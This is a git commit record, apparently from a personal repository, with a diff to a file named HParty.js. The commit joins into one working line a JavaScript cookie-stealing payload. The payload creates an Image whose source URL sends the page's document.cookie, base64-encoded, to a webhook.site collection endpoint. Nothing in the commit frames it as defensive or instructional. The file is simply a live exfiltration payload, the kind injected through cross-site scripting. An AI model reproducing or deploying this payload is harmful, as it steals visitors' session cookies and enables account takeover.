5ae7bc88943bb7c19c03bce263f53aa97d3ecdf1
vichth0r <167537924+vichth0r@users.noreply.github.com>
2024-04-19 16:41:32 +0300

    Update HParty.js

--- HParty.js
+++ HParty.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/6e414c11-5dfe-4916-99a3-501abe98ffac?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/6e414c11-5dfe-4916-99a3-501abe98ffac?data='+btoa(document.cookie);
